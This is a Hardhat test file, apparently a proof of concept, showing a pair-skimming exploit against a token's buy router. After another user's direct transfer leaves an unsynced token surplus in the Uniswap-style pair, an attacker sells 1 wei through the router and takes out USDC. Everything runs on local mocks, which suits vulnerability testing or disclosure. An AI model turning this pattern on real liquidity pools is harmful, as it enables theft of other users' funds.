import { describe, it } from "node:test";
import assert from "node:assert/strict";
import hre from "hardhat";
import { parseEther, parseUnits, getContractAddress } from "viem";

const { viem, networkHelpers } = await hre.network.connect();

async function deployFixture() {
    const wallets = await viem.getWalletClients();

    const owner = wallets[0]!;
    const attacker = wallets[1]!;
    const vault = wallets[2]!;
    const marketing = wallets[3]!;
    const community = wallets[4]!;
    const normalUser = wallets[5]!;

    const publicClient = await viem.getPublicClient();

    // 1. Deploy Mocks
    const usdcContract = await viem.deployContract(
        "contracts/test/MockUSDC.sol:MockUSDC",
        [],
        { client: { wallet: owner } }
    );

    const usdcAddress = usdcContract.address;
    const usdc = await viem.getContractAt("MockUSDC", usdcAddress);

    const factoryContract = await viem.deployContract(
        "MockUniswapV2Factory",
        [],
        { client: { wallet: owner } }
    );

    const factoryAddress = factoryContract.address;
    const factory = await viem.getContractAt(
        "MockUniswapV2Factory",
        factoryAddress
    );

    const routerContract = await viem.deployContract(
        "MockUniswapV2Router",
        [factoryAddress, usdcAddress],
        { client: { wallet: owner } }
    );

    const routerAddress = routerContract.address;

    // 2. Precompute addresses
    const n0 = BigInt(
        await publicClient.getTransactionCount({
            address: owner.account.address,
            blockTag: "pending",
        })
    );

    const nexusAddr = getContractAddress({
        from: owner.account.address,
        nonce: n0,
    });

    const stakingVaultAddr = getContractAddress({
        from: owner.account.address,
        nonce: n0 + 2n,
    });

    // 3. Deploy TCGV
    const tcgvContract = await viem.deployContract(
        "TCGVaultToken",
        [
            stakingVaultAddr,
            routerAddress,
            vault.account.address,
            marketing.account.address,
            community.account.address,
            nexusAddr,
            owner.account.address,
        ],
        { client: { wallet: owner } }
    );

    const tcgvAddress = tcgvContract.address;
    const tcgv = await viem.getContractAt(
        "TCGVaultToken",
        tcgvAddress
    );

    // 4. Create Pair & register it in TCGV
    await factory.write.createPair(
        [tcgvAddress, usdcAddress],
        { account: owner.account }
    );

    const pairAddress = await factory.read.getPair([
        tcgvAddress,
        usdcAddress,
    ]);

    const pair = await viem.getContractAt(
        "MockUniswapV2Pair",
        pairAddress
    );

    await tcgv.write.setPair(
        [pairAddress, true],
        { account: owner.account }
    );

    // 5. Deploy BuyRouter
    const buyRouter = await viem.deployContract(
        "TCGVaultBuyRouter",
        [
            routerAddress,
            usdcAddress,
            tcgvAddress,
            vault.account.address,
            marketing.account.address,
            community.account.address,
        ],
        { client: { wallet: owner } }
    );

    // 6. Seed LP pool
    await tcgv.write.mintPresale(
        [owner.account.address, parseEther("100000")],
        { account: owner.account }
    );

    const usdcLiq = parseUnits("10000", 6);
    const tcgvLiq = parseEther("50000");

    await usdc.write.mint(
        [owner.account.address, usdcLiq],
        { account: owner.account }
    );

    await usdc.write.transfer(
        [pairAddress, usdcLiq],
        { account: owner.account }
    );

    await tcgv.write.transfer(
        [pairAddress, tcgvLiq],
        { account: owner.account }
    );

    await pair.write.mint(
        [owner.account.address],
        { account: owner.account }
    );

    // Exclude BuyRouter from TCGV fees
    await tcgv.write.setExcludedFromFees(
        [buyRouter.address, true],
        { account: owner.account }
    );

    // 7. Give attacker initial funds
    await usdc.write.mint(
        [attacker.account.address, parseUnits("1000", 6)],
        { account: owner.account }
    );

    await tcgv.write.mintPresale(
        [attacker.account.address, parseEther("10")],
        { account: owner.account }
    );

    return {
        owner,
        attacker,
        normalUser,
        usdc,
        tcgv,
        pair,
        buyRouter,
        publicClient,
    };
}

describe(
    "TCGVaultBuyRouter - Pair Skimming Exploit",
    function () {

        it(
            "Should allow an attacker to extract USDC from the Pair using only 1 wei after a direct TCGV transfer creates an unsynced surplus",
            async function () {

                const fix =
                    await networkHelpers.loadFixture(
                        deployFixture
                    );

                // =========================================================
                // 1. PRODUCTION FLOW:
                //    A normal user directly transfers TCGV to the Pair.
                //
                //    TCGVaultToken recognizes `to == pair` as a SELL,
                //    applies the 5% sell tax, and sends the remaining
                //    95% to the Pair.
                //
                //    No pair.swap(), pair.mint(), or pair.sync() is called.
                //    Therefore the Pair balance increases while reserves
                //    remain unchanged.
                // =========================================================

                const directTransferAmount =
                    parseEther("100000");

                // Give normal user enough TCGV to perform the transfer.
                await fix.tcgv.write.mintPresale(
                    [
                        fix.normalUser.account.address,
                        directTransferAmount,
                    ],
                    { account: fix.owner.account }
                );

                const normalUserTcgvBefore =
                    await fix.tcgv.read.balanceOf([
                        fix.normalUser.account.address,
                    ]);

                const reservesBeforeTransfer =
                    await fix.pair.read.getReserves();

                const pairTcgvBeforeTransfer =
                    await fix.tcgv.read.balanceOf([
                        fix.pair.address,
                    ]);

                const pairUsdcBeforeTransfer =
                    await fix.usdc.read.balanceOf([
                        fix.pair.address,
                    ]);

                console.log(
                    `\n[+] Pair reserves BEFORE direct transfer:`
                );

                console.log(
                    `    Reserve0=${reservesBeforeTransfer[0]}`
                );

                console.log(
                    `    Reserve1=${reservesBeforeTransfer[1]}`
                );

                console.log(
                    `[+] Pair ACTUAL TCGV BEFORE: ${pairTcgvBeforeTransfer}`
                );

                console.log(
                    `[+] Pair ACTUAL USDC BEFORE: ${pairUsdcBeforeTransfer}`
                );

                // Direct transfer to Pair.
                await fix.tcgv.write.transfer(
                    [
                        fix.pair.address,
                        directTransferAmount,
                    ],
                    { account: fix.normalUser.account }
                );

                const normalUserTcgvAfter =
                    await fix.tcgv.read.balanceOf([
                        fix.normalUser.account.address,
                    ]);

                const reservesAfterTransfer =
                    await fix.pair.read.getReserves();

                const pairTcgvAfterTransfer =
                    await fix.tcgv.read.balanceOf([
                        fix.pair.address,
                    ]);

                const pairUsdcAfterTransfer =
                    await fix.usdc.read.balanceOf([
                        fix.pair.address,
                    ]);

                console.log(
                    `\n[+] Normal user TCGV spent: ${
                        normalUserTcgvBefore -
                        normalUserTcgvAfter
                    }`
                );

                console.log(
                    `[+] Pair reserves AFTER direct transfer:`
                );

                console.log(
                    `    Reserve0=${reservesAfterTransfer[0]}`
                );

                console.log(
                    `    Reserve1=${reservesAfterTransfer[1]}`
                );

                console.log(
                    `[+] Pair ACTUAL TCGV AFTER: ${pairTcgvAfterTransfer}`
                );

                console.log(
                    `[+] Pair ACTUAL USDC AFTER: ${pairUsdcAfterTransfer}`
                );

                // The token takes a 5% sell tax.
                // Therefore the Pair should receive ~95,000 TCGV.
                const expectedPairIncrease =
                    parseEther("95000");

                const pairIncrease =
                    pairTcgvAfterTransfer -
                    pairTcgvBeforeTransfer;

                console.log(
                    `[+] TCGV actually received by Pair: ${pairIncrease}`
                );

                assert.equal(
                    pairIncrease,
                    expectedPairIncrease,
                    "Pair did not receive the expected 95% after sell tax"
                );

                // Reserves must remain unchanged.
                assert.equal(
                    reservesAfterTransfer[0],
                    reservesBeforeTransfer[0],
                    "USDC reserve changed unexpectedly"
                );

                assert.equal(
                    reservesAfterTransfer[1],
                    reservesBeforeTransfer[1],
                    "TCGV reserve changed despite direct transfer"
                );

                // Calculate unsynced surplus.
                //
                // IMPORTANT:
                // Make sure Reserve1 is actually the TCGV reserve
                // for this Pair configuration.
                const tcgvSurplus =
                    pairTcgvAfterTransfer -
                    reservesAfterTransfer[1];

                console.log(
                    `[!] Unsynced TCGV surplus: ${tcgvSurplus}`
                );

                assert.equal(
                    tcgvSurplus,
                    expectedPairIncrease,
                    "Expected TCGV surplus was not created"
                );

                // =========================================================
                // 2. ATTACK:
                //    Attacker sells ONLY 1 wei TCGV.
                //
                //    The router transfers 1 wei to the Pair and invokes
                //    the supporting-fee-on-transfer swap.
                //
                //    The Pair calculates:
                //
                //    amountInput =
                //        actualBalance - reserve
                //
                //    Therefore the ~95,000 TCGV surplus is interpreted
                //    as swap input even though the attacker supplied
                //    only 1 wei.
                // =========================================================

                const attackerUsdcBefore =
                    await fix.usdc.read.balanceOf([
                        fix.attacker.account.address,
                    ]);

                const attackerTcgvBefore =
                    await fix.tcgv.read.balanceOf([
                        fix.attacker.account.address,
                    ]);

                console.log(
                    `\n[+] Attacker USDC BEFORE: ${attackerUsdcBefore}`
                );

                console.log(
                    `[+] Attacker TCGV BEFORE: ${attackerTcgvBefore}`
                );

                const amountIn = 1n;

                const deadline =
                    BigInt(
                        Math.floor(Date.now() / 1000) + 3600
                    );

                await fix.tcgv.write.approve(
                    [
                        fix.buyRouter.address,
                        amountIn,
                    ],
                    { account: fix.attacker.account }
                );

                // Execute exploit.
                await fix.buyRouter.write.sellTCGVForUSDC(
                    [
                        amountIn,
                        0n,
                        deadline,
                    ],
                    { account: fix.attacker.account }
                );

                // =========================================================
                // 3. VERIFY ATTACKER PROFIT
                // =========================================================

                const attackerUsdcAfter =
                    await fix.usdc.read.balanceOf([
                        fix.attacker.account.address,
                    ]);

                const attackerTcgvAfter =
                    await fix.tcgv.read.balanceOf([
                        fix.attacker.account.address,
                    ]);

                const reservesAfterAttack =
                    await fix.pair.read.getReserves();

                const pairTcgvAfterAttack =
                    await fix.tcgv.read.balanceOf([
                        fix.pair.address,
                    ]);

                const pairUsdcAfterAttack =
                    await fix.usdc.read.balanceOf([
                        fix.pair.address,
                    ]);

                console.log(
                    `\n[+] Attacker USDC AFTER: ${attackerUsdcAfter}`
                );

                console.log(
                    `[+] Attacker TCGV AFTER: ${attackerTcgvAfter}`
                );

                console.log(
                    `\n[+] Pair reserves AFTER ATTACK:`
                );

                console.log(
                    `    Reserve0=${reservesAfterAttack[0]}`
                );

                console.log(
                    `    Reserve1=${reservesAfterAttack[1]}`
                );

                console.log(
                    `[+] Pair ACTUAL TCGV AFTER ATTACK: ${pairTcgvAfterAttack}`
                );

                console.log(
                    `[+] Pair ACTUAL USDC AFTER ATTACK: ${pairUsdcAfterAttack}`
                );

                // Attacker supplied exactly 1 wei.
                const attackerTcgvSpent =
                    attackerTcgvBefore -
                    attackerTcgvAfter;

                assert.equal(
                    attackerTcgvSpent,
                    amountIn,
                    "Attacker did not spend exactly 1 wei of TCGV"
                );

                const usdcGained =
                    attackerUsdcAfter -
                    attackerUsdcBefore;

                const pairUsdcLoss =
                    pairUsdcBeforeTransfer -
                    pairUsdcAfterAttack;

                console.log(
                    `\n[!] Attacker USDC gained: ${usdcGained}`
                );

                console.log(
                    `[!] Pair USDC loss: ${pairUsdcLoss}`
                );

                // Attacker should receive substantial USDC
                // despite spending only 1 wei of TCGV.
                assert.ok(
                    usdcGained > parseUnits("1000", 6),
                    "Attacker did not successfully extract a significant amount of USDC"
                );

                // Pair must have lost USDC.
                assert.ok(
                    pairUsdcLoss > 0n,
                    "Pair did not lose USDC"
                );

                console.log(
                    `\n[!!!] EXPLOIT SUCCESSFUL`
                );

                console.log(
                    `[!!!] Attacker spent: ${attackerTcgvSpent} wei TCGV`
                );

                console.log(
                    `[!!!] Attacker gained: ${usdcGained} USDC units`
                );

                console.log(
                    `[!!!] Unsynced surplus exploited: ${tcgvSurplus} TCGV`
                );
            }
        );
    }
);
